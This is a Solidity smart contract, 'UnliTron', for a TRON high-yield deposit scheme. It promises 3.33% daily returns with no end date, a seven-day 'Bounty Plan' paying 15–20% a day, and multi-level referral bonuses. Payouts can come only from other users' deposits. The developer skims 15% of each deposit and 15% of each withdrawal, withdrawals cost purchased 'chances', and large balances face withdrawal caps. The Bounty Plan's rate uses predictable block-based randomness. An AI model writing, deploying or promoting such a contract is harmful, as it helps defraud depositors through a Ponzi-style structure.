//SourceUnit: UnliTron.sol

pragma solidity 0.5.8;

contract UnliTron {
    // -- Investor -- //
    struct InfinitePlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 dividends;
        uint256 depositsCount;
        uint256 withdrawn;
    }

    struct LuckyPlan {
        uint256 activeDeposit;
        uint256 recordDeposit;
        uint256 tarif;
        uint256 dividends;
        uint256 depositsCount;
        uint256 depositStartTime;
        uint256 depositFinishTime;
        uint256 withdrawn;
    }

    struct Player {
        // unlimited Plan
        InfinitePlan[1] infinitePlan;

        // bounty Plan
        LuckyPlan[1] luckyPlan;

        // General
        uint8   withdrawChances;
        address upline;
        uint256 direct_bonus;
        uint256 match_bonus;
        uint256 last_payout;
        uint256 total_withdrawn;
        uint256 total_reinvested;
        uint256 total_withdrawnReferral;
        uint256 total_match_bonus;
        uint256 total_direct_bonus;
        uint256 total_invested;
        uint256 firstDep_Time;
        mapping(uint8 => uint256) structure;
    }
    // -- Investor -- //

    // unlimited Plan
    uint256 private infinitePlanDeposit_StartTime;
    uint40 private infinitePlanDeposit_TimeToStart;
    uint40 private min_InfiniteInvest;
    uint40 private max_InfiniteInvest;
    uint40 private min_InfiniteWithdraw;
    uint256 private infiniteTarif;

    // bounty Plan
    uint256 private luckyPlanDeposit_StartTime;
    uint40 private luckyPlanDeposit_TimeToStart;
    uint40 private luckyPlan_LifeTime;
    uint40 private min_LuckyInvest;
    uint40 private max_LuckyInvest;
    uint40 private min_LuckyWithdraw;

    // General
    address payable private developer;
    uint256 private contract_CreateTime;
    uint256 private contract_StartTime;
    uint40  private contract_TimeToStart;
    uint8   private defaultWithdrawChances;
    uint256 private invested;
	uint256 private investors;
    uint256 private totalWithdrawn;
    uint256 private totalWithdrawnReferral;
    uint256 private direct_bonus;
    uint256 private match_bonus;
    uint256 private maintenance_fee;
    uint256 private advertising_fee;
    uint256 private whaleBalance;
    uint256 private whaleRetrivePercent;
    uint256 private infiniteDepositCount;
    uint256 private luckyDepositCount;
    uint256 private revokeCount;
    uint256 private revokeRetPercent;
    uint8[] private ref_bonuses;
    mapping(address => Player) private players;

    event Upline(address indexed addr, address indexed upline, uint256 bonus);
    event NewDeposit(address indexed addr, uint256 amount);
    event MatchPayout(address indexed addr, address indexed from, uint256 amount);
    event Withdraw(address indexed addr, uint256 amount);

    constructor() public {
        developer = msg.sender;
        contract_CreateTime = now;
        contract_TimeToStart = 33 * 60 * 60;
        contract_StartTime = contract_CreateTime + contract_TimeToStart;
        maintenance_fee = 15;
        advertising_fee = 15;
        defaultWithdrawChances = 5;
        revokeRetPercent = 50;
        whaleBalance = 30000E6;
        whaleRetrivePercent = 50;
        ref_bonuses.push(6);
        ref_bonuses.push(4);

        // unlimited Plan
        infiniteTarif = 3.33E6;
        infinitePlanDeposit_TimeToStart = 0 * 24 * 60 * 60;
        infinitePlanDeposit_StartTime = contract_CreateTime + infinitePlanDeposit_TimeToStart;
        min_InfiniteInvest = 100E6;
        max_InfiniteInvest = 1000000E6;
        min_InfiniteWithdraw = 30E6;

        // bounty Plan
        luckyPlanDeposit_TimeToStart = contract_TimeToStart;
        luckyPlanDeposit_StartTime = contract_CreateTime + luckyPlanDeposit_TimeToStart;
        luckyPlan_LifeTime = 7 * 24 * 60 * 60;
        min_LuckyInvest = 1000E6;
        max_LuckyInvest = 1000E6;
        min_LuckyWithdraw = 0;
    }

    modifier onlyDeveloper {
        require(msg.sender == developer);
        _;
    }

    function revokeContract() external {
        uint256 retriveAmountTotal = getRetriveAmountT(msg.sender, revokeRetPercent);
        require(retriveAmountTotal > 0, "Earnings exceed deposited funds");

        uint contractBalance = address(this).balance;
        if (contractBalance > retriveAmountTotal) {
          resetPlayerStatistics(msg.sender);
          totalWithdrawn += retriveAmountTotal;
          totalWithdrawnReferral += getRetriveAmountR(msg.sender);
          revokeCount++;
          investors--;
          msg.sender.transfer(retriveAmountTotal);
          payOwnerMaintenanceFee(retriveAmountTotal);
        }
    }

   function getRetriveAmountT(address _addr, uint256 rt) private view returns(uint256) {
       return (getRetriveAmountIL(_addr) * rt / 100) + (getRetriveAmountR(_addr));
   }

   function getRetriveAmountIL(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       uint256 a = player.infinitePlan[0].recordDeposit + player.luckyPlan[0].recordDeposit;
       uint256 b = player.infinitePlan[0].withdrawn + player.luckyPlan[0].withdrawn;
       return minZero(a, b);
   }

   function getRetriveAmountR(address _addr) private view returns(uint256) {
       Player storage player = players[_addr];
       return (player.match_bonus + player.direct_bonus);
   }

    function resetPlayerStatistics(address _addr) private {
        Player storage player = players[_addr];
        player.infinitePlan[0].activeDeposit = 0;
        player.infinitePlan[0].recordDeposit = 0;
        player.infinitePlan[0].dividends = 0;
        player.infinitePlan[0].depositsCount = 0;
        player.infinitePlan[0].withdrawn = 0;

        player.luckyPlan[0].activeDeposit = 0;
        player.luckyPlan[0].recordDeposit = 0;
        player.luckyPlan[0].tarif = 0;
        player.luckyPlan[0].dividends = 0;
        player.luckyPlan[0].depositsCount = 0;
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = now;
        player.luckyPlan[0].withdrawn = 0;

        player.withdrawChances = 0;
        player.direct_bonus = 0;
        player.match_bonus = 0;
        player.last_payout = now;
        player.total_withdrawn = 0;
        player.total_reinvested = 0;
        player.total_withdrawnReferral = 0;
        player.total_match_bonus = 0;
        player.total_direct_bonus = 0;
        player.total_invested = 0;
        player.firstDep_Time = 0;
        player.upline = address(0);
    }

    function refPayout(address _addr, uint256 _amount) private {
        address up = players[_addr].upline;

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            if(up == address(0)) break;

            uint256 bonus = _amount * ref_bonuses[i] / 100;

            players[up].match_bonus += bonus;
            players[up].total_match_bonus += bonus;

            match_bonus += bonus;

            emit MatchPayout(up, _addr, bonus);

            up = players[up].upline;
        }
    }

    function setUpline(address _addr, address _upline, uint256 _amount) private {
        if(players[_addr].upline == address(0) && _addr != developer) {
             if(players[_upline].infinitePlan[0].activeDeposit == 0) {
                 _upline = developer;
             }
             else {
                 players[_addr].direct_bonus += _amount * 1 / 100;
                 players[_addr].total_direct_bonus += _amount * 1 / 100;
                 direct_bonus += _amount * 1 / 100;
             }

            players[_addr].upline = _upline;

            emit Upline(_addr, _upline, _amount * 1 / 100);

            for(uint8 i = 0; i < ref_bonuses.length; i++) {
                players[_upline].structure[i]++;

                _upline = players[_upline].upline;

                if(_upline == address(0)) break;
            }
        }
    }

    function getLuckyTarif()  view private  returns (uint256) {
        uint8 value = uint8(uint256(keccak256(abi.encode(block.timestamp, block.difficulty)))%6) + 15;
        return value;
    }

    function infinitePlanDeposit(address _upline) external payable {
        Player storage player = players[msg.sender];

        require(now >= infinitePlanDeposit_StartTime, "Unlimited Plan is not available yet");
        require(msg.value >= min_InfiniteInvest, "Minimum to invest is 100 TRX");
        require(msg.value <= max_InfiniteInvest, "Maximum to invest is 1 000 000 TRX");

        setUpline(msg.sender, _upline, msg.value);

        if (player.infinitePlan[0].depositsCount == 0) {
            player.firstDep_Time = now;
            if (contract_StartTime > now) {
               player.last_payout = contract_StartTime;
            } else {
               player.last_payout = now;
            }
            investors++;
            player.withdrawChances = defaultWithdrawChances;
        } else {
            update_InfinitePlanInterestProfit(msg.sender);
        }

        player.infinitePlan[0].depositsCount++;
        infiniteDepositCount ++;
        invested += msg.value;
        player.infinitePlan[0].activeDeposit += msg.value;
        player.infinitePlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;

        payOwnerAdvertisingFee(msg.value);

        refPayout(msg.sender, msg.value);

        emit NewDeposit(msg.sender, msg.value);
    }

    function luckyPlanDeposit() external payable {
        Player storage player = players[msg.sender];

        require(now >= luckyPlanDeposit_StartTime, "Bounty Plan is not available yet");
        require(player.luckyPlan[0].activeDeposit == 0, "Only 1 Bounty Plan is allowed at the same time");
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, "Unlimited Plan Deposit is require first");
        require(msg.value >= min_LuckyInvest && msg.value <= max_LuckyInvest, "Bounty Plan Deposit must be 1000 TRX");

        player.luckyPlan[0].depositsCount++;
        luckyDepositCount++;
        invested += msg.value;
        player.luckyPlan[0].activeDeposit = msg.value;
        player.luckyPlan[0].recordDeposit += msg.value;
        player.total_invested += msg.value;
        player.luckyPlan[0].tarif = getLuckyTarif();
        player.luckyPlan[0].depositStartTime = now;
        player.luckyPlan[0].depositFinishTime = player.luckyPlan[0].depositStartTime + luckyPlan_LifeTime;

        payOwnerAdvertisingFee(msg.value);
        emit NewDeposit(msg.sender, msg.value);
    }

    function update_InfinitePlanInterestProfit(address _addr) private {
        Player storage player = players[_addr];
        uint256 amount = getInfinitePlan_InterestProfit(_addr);
        if(amount > 0) {
            player.infinitePlan[0].dividends += amount;
            player.last_payout = now;
        }
    }

    function infinitePlanWithdraw() external {
        Player storage player = players[msg.sender];
        require(player.withdrawChances > 0, "You have to buy Withdraw Chances");

        uint contractBalance = address(this).balance;
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 amount = player.infinitePlan[0].dividends;

        if (player.infinitePlan[0].activeDeposit > whaleBalance) {
           uint256 wAmount = amount * whaleRetrivePercent / 100;
           amount = wAmount;
        }

        require(amount >= min_InfiniteWithdraw, "Minimum Withdraw is 30 TRX");
        require(contractBalance >= amount, "Contract balance < Interest Profit");

        if (player.infinitePlan[0].activeDeposit > whaleBalance) {
           player.infinitePlan[0].dividends -= amount;
        } else {
           player.infinitePlan[0].dividends = 0;
        }

        player.total_withdrawn += amount;
        player.infinitePlan[0].withdrawn += amount;
        totalWithdrawn += amount;
        player.withdrawChances--;

        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }

    function luckyPlanWithdraw() external {
        Player storage player = players[msg.sender];
        require(player.luckyPlan[0].depositFinishTime < now, "Plan not finished yet");

        uint amount = getLuckyPlan_InterestProfit(msg.sender);
        uint contractBalance = address(this).balance;
        require(contractBalance >= amount, "Contract balance < Interest Profit");

        player.luckyPlan[0].activeDeposit = 0;
        player.luckyPlan[0].tarif = 0;
        player.total_withdrawn += amount;
        player.luckyPlan[0].withdrawn += amount;
        totalWithdrawn += amount;

        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }

    function referralWithdraw() external {
        Player storage player = players[msg.sender];
        uint contractBalance = address(this).balance;
        require(player.infinitePlan[0].depositsCount > 0, "Active deposit is require");
        require(contractBalance >= player.match_bonus + player.direct_bonus, "Contract balance < Referral bonus");

        uint256 amount = player.match_bonus + player.direct_bonus;
        player.match_bonus = 0;
        player.direct_bonus = 0;

        player.total_withdrawn += amount;
        player.total_withdrawnReferral += amount;
        totalWithdrawnReferral += amount;
        totalWithdrawn += amount;

        msg.sender.transfer(amount);
        payOwnerMaintenanceFee(amount);
        emit Withdraw(msg.sender, amount);
    }

    function buyWithdrawChances() external payable {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, "Unlimited Plan Deposit is require first");
        require(msg.value == 100E6, "Minimum amount must be 100");
        player.withdrawChances += defaultWithdrawChances; // Add 5 WithdrawChances
    }

    function infinitePlanReinvest() external {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, "Unlimited Plan Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends;
        player.infinitePlan[0].dividends = 0;
        player.infinitePlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }

    function allReinvest() external {
        Player storage player = players[msg.sender];
        require(player.infinitePlan[0].activeDeposit >= min_InfiniteInvest, "Unlimited Plan Deposit is require first");
        update_InfinitePlanInterestProfit(msg.sender);
        uint256 reinvestAmount = player.infinitePlan[0].dividends + player.match_bonus + player.direct_bonus;
        player.infinitePlan[0].dividends = 0;
        player.match_bonus = 0;
        player.direct_bonus = 0;
        player.infinitePlan[0].activeDeposit += reinvestAmount;
        player.total_reinvested += reinvestAmount;
    }

    function getInfinitePlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        uint256 fr = player.last_payout;
        if (contract_StartTime > now) {
          fr = now;
        }

        uint256 to = now;

        if(fr < to) {
            value = player.infinitePlan[0].activeDeposit * (to - fr) * infiniteTarif / 86400 / 100E6;
        } else {
            value = 0;
        }
        return value;
    }

    function getLuckyPlan_InterestProfit(address _addr) view private returns(uint256 value) {
        Player storage player = players[_addr];
        if (player.luckyPlan[0].activeDeposit > 0) {
          if (now < player.luckyPlan[0].depositFinishTime) {
               uint256 fr = player.luckyPlan[0].depositStartTime;
               uint256 to = now;
               value = player.luckyPlan[0].activeDeposit * (to - fr) * player.luckyPlan[0].tarif / 86400 / 100;
          } else {
            value = player.luckyPlan[0].activeDeposit * luckyPlan_LifeTime * player.luckyPlan[0].tarif / 86400 / 100;
          }
        } else {
            value = 0;
        }
        return value;
    }

    function activeInfiniteInvest(address _addr) external view onlyDeveloper returns(uint256) {
        Player storage player = players[_addr];
        uint256 value = player.infinitePlan[0].activeDeposit;
        return value;
    }

    function activeLuckyInvest(address _addr) external view onlyDeveloper returns(uint256) {
        Player storage player = players[_addr];
        uint256 value = player.luckyPlan[0].activeDeposit;
        return value;
    }

    function payOwnerMaintenanceFee(uint256 val) private {
        uint256 amount_maintenance = (val * maintenance_fee) / 100;
        developer.transfer(amount_maintenance);
    }

    function payOwnerAdvertisingFee(uint256 val) private {
        uint256 amount_advertising = (val * advertising_fee) / 100;
        developer.transfer(amount_advertising);
    }

    function minZero(uint256 a, uint256 b) private pure returns(uint256) {
        if (a > b) {
           return a - b;
        } else {
           return 0;
        }
    }

    function userGeneralInfo(address _addr) view external returns(uint256 _totalInvested, uint256 _totalReinvested, uint256 _totalWithdrawn, uint256 _total_WithdrawnReferral,
                                                                  uint256 _totalMatchBonus, uint256 _totalDirectBonus,  uint256 _matchBonus, uint256 _directBonus,
                                                                  uint256 _withdrawChances, uint256 _runningTime, uint256[3] memory _structure) {
        Player storage player = players[_addr];

        uint256 runningTime = 0;
        if (player.total_invested > 0) {
         runningTime = now - player.firstDep_Time;
        }

        for(uint8 i = 0; i < ref_bonuses.length; i++) {
            _structure[i] = player.structure[i];
        }
        return (
            player.total_invested,
            player.total_reinvested,
            player.total_withdrawn,
            player.total_withdrawnReferral,
            player.total_match_bonus,
            player.total_direct_bonus,
            player.match_bonus,
            player.direct_bonus,
            player.withdrawChances,
            runningTime,
            _structure
        );
    }

    function userRevokeContractInfo(address _addr) view external returns(uint256 _revokeRetAmountIL, uint256 _revokeRetAmountR, uint256 _revokeRetAmountT) {
        return (
            getRetriveAmountT(_addr, revokeRetPercent) - getRetriveAmountR(_addr),
            getRetriveAmountR(_addr),
            getRetriveAmountT(_addr, revokeRetPercent)
        );
    }

    function userInfinitePlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _dividends, uint256 _depositsCount, uint256 _withdrawn) {
        Player storage player = players[_addr];
        return (
            player.infinitePlan[0].activeDeposit,
            player.infinitePlan[0].recordDeposit,
            player.infinitePlan[0].dividends + getInfinitePlan_InterestProfit(_addr),
            player.infinitePlan[0].depositsCount,
            player.infinitePlan[0].withdrawn
        );
    }

    function userLuckyPlanInfo(address _addr) view external returns(uint256 _activeDeposit, uint256 _recordDeposit, uint256 _tarif, uint256 _dividends, uint256 _depositsCount,
                                                                    uint256 _depositStartTime, uint256 _depositFinishTime, uint256 _withdrawn, uint256 _nextWithdraw) {
        Player storage player = players[_addr];
        return (
            player.luckyPlan[0].activeDeposit,
            player.luckyPlan[0].recordDeposit,
            player.luckyPlan[0].tarif,
            getLuckyPlan_InterestProfit(_addr),
            player.luckyPlan[0].depositsCount,
            player.luckyPlan[0].depositStartTime,
            player.luckyPlan[0].depositFinishTime,
            player.luckyPlan[0].withdrawn,
            minZero(player.luckyPlan[0].depositFinishTime, now)
        );
    }

    function contractInfo() view external returns(uint256 _invested, uint256 _investors, uint256 _matchBonus, uint256 _infiniteDepositCount, uint256 _luckyDepositCount,
                                                  uint256 _contractStartTime, uint256 _contractIniTime, uint256 _infiniteDepIniTime, uint256 _luckyDepIniTime) {
        return (
            invested,
            investors,
            match_bonus,
            infiniteDepositCount,
            luckyDepositCount,
            contract_StartTime,
            minZero(contract_StartTime, now),
            minZero(infinitePlanDeposit_StartTime, now),
            minZero(luckyPlanDeposit_StartTime, now)
        );
    }
}